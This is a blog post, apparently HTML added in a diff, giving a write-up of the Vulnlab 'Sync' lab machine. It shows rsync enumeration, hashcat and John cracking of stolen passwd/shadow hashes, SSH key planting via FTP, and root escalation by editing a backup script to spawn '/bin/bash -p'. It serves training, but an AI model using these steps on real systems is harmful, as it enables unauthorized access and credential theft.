@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Vulnlab :: Sync Writeup">
+<title>Vulnlab :: Sync Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/p/vulnlab-sync-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Vulnlab :: Sync Writeup">
+<meta property='og:description' content="Vulnlab :: Sync Writeup">
+<meta property='og:url' content='http://localhost:1313/p/vulnlab-sync-writeup/'>
+<meta property='og:site_name' content='qrxnz&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='exegol' /><meta property='article:tag' content='nmap' /><meta property='article:tag' content='linux' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='hashcat' /><meta property='article:tag' content='john-the-ripper' /><meta property='article:tag' content='pwncat-cs' /><meta property='article:tag' content='misconfigurations' /><meta property='article:tag' content='rsync' /><meta property='article:tag' content='php' /><meta property='article:tag' content='sqlite' /><meta property='article:tag' content='ftp' /><meta property='article:tag' content='ssh' /><meta property='article:published_time' content='2025-01-15T12:02:13&#43;01:00'/><meta property='article:modified_time' content='2025-01-15T12:02:13&#43;01:00'/>
+<meta name="twitter:title" content="Vulnlab :: Sync Writeup">
+<meta name="twitter:description" content="Vulnlab :: Sync Writeup">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11101733084245688547.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😺</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">qrxnz&#39;s blog</a></h1>
+            <h2 class="site-description">I use keyboard BTW</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/qrxnz'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-github"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/karol-skoczyk17'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linkedin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linktr.ee/qrxnz'
+                        target="_blank"
+                        title="Linktree"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linktree"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 10h16" /><path d="M6.5 4.5l11 11" /><path d="M6.5 15.5l11 -11" /><path d="M12 10v-8" /><path d="M12 15v7" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://mastodon.social/@qrxnz'
+                        target="_blank"
+                        title="Mastodon"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-mastodon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18.648 15.254c-1.816 1.763 -6.648 1.626 -6.648 1.626a18.262 18.262 0 0 1 -3.288 -.256c1.127 1.985 4.12 2.81 8.982 2.475c-1.945 2.013 -13.598 5.257 -13.668 -7.636l-.026 -1.154c0 -3.036 .023 -4.115 1.352 -5.633c1.671 -1.91 6.648 -1.666 6.648 -1.666s4.977 -.243 6.648 1.667c1.329 1.518 1.352 2.597 1.352 5.633s-.456 4.074 -1.352 4.944z" /><path d="M12 11.204v-2.926c0 -1.258 -.895 -2.278 -2 -2.278s-2 1.02 -2 2.278v4.722m4 -4.722c0 -1.258 .895 -2.278 2 -2.278s2 1.02 2 2.278v4.722" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.youtube.com/@qrxnz9209/'
+                        target="_blank"
+                        title="Youtube"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-youtube"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M2 8a4 4 0 0 1 4 -4h12a4 4 0 0 1 4 4v8a4 4 0 0 1 -4 4h-12a4 4 0 0 1 -4 -4v-8z" /><path d="M10 9l5 3l-5 3z" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+      </ol>
+    </li>
+    <li><a href="#rsync">Rsync</a></li>
+    <li><a href="#app">App</a>
+      <ol>
+        <li><a href="#php">PHP</a></li>
+        <li><a href="#database">Database</a></li>
+        <li><a href="#hashcat">hashcat</a></li>
+      </ol>
+    </li>
+    <li><a href="#ftp">FTP</a>
+      <ol>
+        <li><a href="#ftp-access">FTP access</a></li>
+        <li><a href="#ssh-key-upload">SSH key upload</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ol>
+        <li><a href="#guessing">Guessing</a></li>
+        <li><a href="#backup">/backup</a></li>
+        <li><a href="#john-the-ripper">John The Ripper</a></li>
+        <li><a href="#backupsh">backup.sh</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/vulnlab/" >
+                Vulnlab
+            </a>
+        
+            <a href="/categories/ctf/" >
+                Ctf
+            </a>
+        
+            <a href="/categories/misconfigurations/" >
+                Misconfigurations
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/vulnlab-sync-writeup/">Vulnlab :: Sync Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 15, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/vulnlab-sync-writeup/image-17.png"
+	width="537"
+	height="621"
+	srcset="/p/vulnlab-sync-writeup/image-17_hu13579974232266791855.png 480w, /p/vulnlab-sync-writeup/image-17_hu10523741402024455397.png 1024w"
+	loading="lazy"
+	
+		alt="pwned-sync"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="86"
+		data-flex-basis="207px"
+	
+></p>
+<h2 id="enumeration">Enumeration
+</h2><h3 id="nmap-scan">Nmap scan
+</h3><p>I start with a standard scan using nmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-02 18:11 CET
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.95.205
+</span></span><span class="line"><span class="cl">Host is up (0.036s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65531 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp     vsftpd 3.0.5
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey:
+</span></span><span class="line"><span class="cl">|   256 5840f1968f678e470e7ee41c1128949c (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 4b59e4b26397e5142d4df8d8c913ca2c (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+</span></span><span class="line"><span class="cl">| http-cookie-flags:
+</span></span><span class="line"><span class="cl">|   /:
+</span></span><span class="line"><span class="cl">|     PHPSESSID:
+</span></span><span class="line"><span class="cl">|_      httponly flag not set
+</span></span><span class="line"><span class="cl">|_http-title: Login
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span class="line"><span class="cl">873/tcp open  rsync   (protocol version 31)
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="rsync">Rsync
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av --list-only rsync://10.10.95.205/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av --list-only rsync://10.10.95.205/httpd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-sync-writeup/image.png"
+	width="1054"
+	height="255"
+	srcset="/p/vulnlab-sync-writeup/image_hu11791243061777677801.png 480w, /p/vulnlab-sync-writeup/image_hu7407030714204118597.png 1024w"
+	loading="lazy"
+	
+		alt="rsync"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="413"
+		data-flex-basis="992px"
+	
+></p>
+<p>The machine has an exposed rsync, which contains a application backup</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rsync -av rsync://10.10.95.205/httpd ./httpd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="app">App
+</h2><h3 id="php">PHP
+</h3><p>In the PHP code, there is a secret and the logic that creates the hashes</p>
+<p><img src="/p/vulnlab-sync-writeup/image-1.png"
+	width="1192"
+	height="693"
+	srcset="/p/vulnlab-sync-writeup/image-1_hu11431606914057566263.png 480w, /p/vulnlab-sync-writeup/image-1_hu12210071686083584311.png 1024w"
+	loading="lazy"
+	
+		alt="index-php"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="412px"
+	
+></p>
+<h3 id="database">Database
+</h3><p><img src="/p/vulnlab-sync-writeup/image-2.png"
+	width="930"
+	height="309"
+	srcset="/p/vulnlab-sync-writeup/image-2_hu8790594832348450017.png 480w, /p/vulnlab-sync-writeup/image-2_hu14948347741116375176.png 1024w"
+	loading="lazy"
+	
+		alt="db"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="722px"
+	
+></p>
+<p>In the database, there are the hashes of 2 users</p>
+<h3 id="hashcat">hashcat
+</h3><p><img src="/p/vulnlab-sync-writeup/image-3.png"
+	width="890"
+	height="140"
+	srcset="/p/vulnlab-sync-writeup/image-3_hu13917173351043722109.png 480w, /p/vulnlab-sync-writeup/image-3_hu9096936573705163152.png 1024w"
+	loading="lazy"
+	
+		alt="hashes"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="635"
+		data-flex-basis="1525px"
+	
+></p>
+<p>Using Hashcat, I managed to crack the hash of the password for the user <code>triss</code></p>
+<p><img src="/p/vulnlab-sync-writeup/image-4.png"
+	width="1198"
+	height="591"
+	srcset="/p/vulnlab-sync-writeup/image-4_hu15830187995212166538.png 480w, /p/vulnlab-sync-writeup/image-4_hu1240722426259942689.png 1024w"
+	loading="lazy"
+	
+		alt="hascat modes"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<p><img src="/p/vulnlab-sync-writeup/image-5.png"
+	width="880"
+	height="65"
+	srcset="/p/vulnlab-sync-writeup/image-5_hu11086106851397724580.png 480w, /p/vulnlab-sync-writeup/image-5_hu5465249206720539620.png 1024w"
+	loading="lazy"
+	
+		alt="cracked"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1353"
+		data-flex-basis="3249px"
+	
+></p>
+<h2 id="ftp">FTP
+</h2><h3 id="ftp-access">FTP access
+</h3><p><img src="/p/vulnlab-sync-writeup/image-6.png"
+	width="1018"
+	height="175"
+	srcset="/p/vulnlab-sync-writeup/image-6_hu16361458940035524846.png 480w, /p/vulnlab-sync-writeup/image-6_hu7882297006897746156.png 1024w"
+	loading="lazy"
+	
+		alt="ssh triss"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="581"
+		data-flex-basis="1396px"
+	
+></p>
+<p>We cannot log in to SSH with the obtained password because key-based login is set, but we can log in to the FTP server</p>
+<p><img src="/p/vulnlab-sync-writeup/image-7.png"
+	width="798"
+	height="236"
+	srcset="/p/vulnlab-sync-writeup/image-7_hu324890101834407202.png 480w, /p/vulnlab-sync-writeup/image-7_hu5158482932222418019.png 1024w"
+	loading="lazy"
+	
+		alt="ftp"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="338"
+		data-flex-basis="811px"
+	
+></p>
+<h3 id="ssh-key-upload">SSH key upload
+</h3><p><img src="/p/vulnlab-sync-writeup/image-16.png"
+	width="923"
+	height="376"
+	srcset="/p/vulnlab-sync-writeup/image-16_hu17839421364927544549.png 480w, /p/vulnlab-sync-writeup/image-16_hu1897161405859399833.png 1024w"
+	loading="lazy"
+	
+		alt="home"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="589px"
+	
+></p>
+<p>The FTP server&rsquo;s directory is the home directory of the user <code>triss</code>, which in this case allows for the upload of our public key</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cp ./.ssh/id_rsa.pub /workspace/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat id_rsa.pub &gt; authorized_keys
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/vulnlab-sync-writeup/image-8.png"
+	width="1872"
+	height="430"
+	srcset="/p/vulnlab-sync-writeup/image-8_hu10036061796586939777.png 480w, /p/vulnlab-sync-writeup/image-8_hu118460826732705661.png 1024w"
+	loading="lazy"
+	
+		alt="ftp1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="435"
+		data-flex-basis="1044px"
+	
+></p>
+<p><img src="/p/vulnlab-sync-writeup/image-9.png"
+	width="1875"
+	height="216"
+	srcset="/p/vulnlab-sync-writeup/image-9_hu16157079860813345646.png 480w, /p/vulnlab-sync-writeup/image-9_hu17266027739561210612.png 1024w"
+	loading="lazy"
+	
+		alt="ftp2"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="868"
+		data-flex-basis="2083px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh triss@10.10.95.205 -i id_rsa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Logging in using the public key is now possible</p>
+<h2 id="privilege-escalation">Privilege escalation
+</h2><h3 id="guessing">Guessing
+</h3><p><img src="/p/vulnlab-sync-writeup/image-10.png"
+	width="854"
+	height="59"
+	srcset="/p/vulnlab-sync-writeup/image-10_hu2171427677064081750.png 480w, /p/vulnlab-sync-writeup/image-10_hu1023850624694067846.png 1024w"
+	loading="lazy"
+	
+		alt="home-diretory"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1447"
+		data-flex-basis="3473px"
+	
+></p>
+<p>In the user&rsquo;s directory, we do not find the user flag, but there is a small reference to &ldquo;The Witcher&rdquo; by Andrzej Sapkowski in the task, which makes it easy to guess that the password for the user <code>jennifer</code> is the same as for <code>triss</code></p>
+<p>At this point, we have obtained the user flag!</p>
+<h3 id="backup">/backup
+</h3><p><img src="/p/vulnlab-sync-writeup/image-11.png"
+	width="1079"
+	height="104"
+	srcset="/p/vulnlab-sync-writeup/image-11_hu11953695636346845475.png 480w, /p/vulnlab-sync-writeup/image-11_hu7183186107208297304.png 1024w"
+	loading="lazy"
+	
+		alt="backups"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1037"
+		data-flex-basis="2490px"
+	
+></p>
+<p>After using LinPEAS, I went to the /backup directory</p>
+<p><img src="/p/vulnlab-sync-writeup/image-12.png"
+	width="657"
+	height="402"
+	srcset="/p/vulnlab-sync-writeup/image-12_hu3017313864783419670.png 480w, /p/vulnlab-sync-writeup/image-12_hu6450246386021494453.png 1024w"
+	loading="lazy"
+	
+		alt="backup"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="392px"
+	
+></p>
+<h3 id="john-the-ripper">John The Ripper
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">unshadow passwd shadow &gt; hash.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt --format<span class="o">=</span>crypt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the backup, we manage to obtain the password for the user <code>sa</code></p>
+<h3 id="backupsh">backup.sh
+</h3><p><img src="/p/vulnlab-sync-writeup/image-14.png"
+	width="828"
+	height="109"
+	srcset="/p/vulnlab-sync-writeup/image-14_hu6128281775844092545.png 480w, /p/vulnlab-sync-writeup/image-14_hu15287347215115847073.png 1024w"
+	loading="lazy"
+	
+		alt="linpeas"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="759"
+		data-flex-basis="1823px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">mkdir -p /tmp/backup
+</span></span><span class="line"><span class="cl">cp -r /opt/httpd /tmp/backup
+</span></span><span class="line"><span class="cl">cp /etc/passwd /tmp/backup
+</span></span><span class="line"><span class="cl">cp /etc/shadow /tmp/backup
+</span></span><span class="line"><span class="cl">cp /etc/rsyncd.conf /tmp/backup
+</span></span><span class="line"><span class="cl">zip -r /backup/<span class="k">$(</span>date +%s<span class="k">)</span>.zip /tmp/backup
+</span></span><span class="line"><span class="cl">rm -rf /tmp/backup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After using LinPEAS again, we discover a backup script that is owned by the user <code>sa</code></p>
+<p><img src="/p/vulnlab-sync-writeup/image-15.png"
+	width="348"
+	height="89"
+	srcset="/p/vulnlab-sync-writeup/image-15_hu14626828572233971180.png 480w, /p/vulnlab-sync-writeup/image-15_hu10465474941121319362.png 1024w"
+	loading="lazy"
+	
+		alt="new backup.sh"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="391"
+		data-flex-basis="938px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/bin/bash -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After modifying the content of the script and executing it, I can gain access as <code>root</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/exegol/">Exegol</a>
+        
+            <a href="/tags/nmap/">Nmap</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/ctf/">Ctf</a>
+        
+            <a href="/tags/hashcat/">Hashcat</a>
+        
+            <a href="/tags/john-the-ripper/">John-the-Ripper</a>
+        
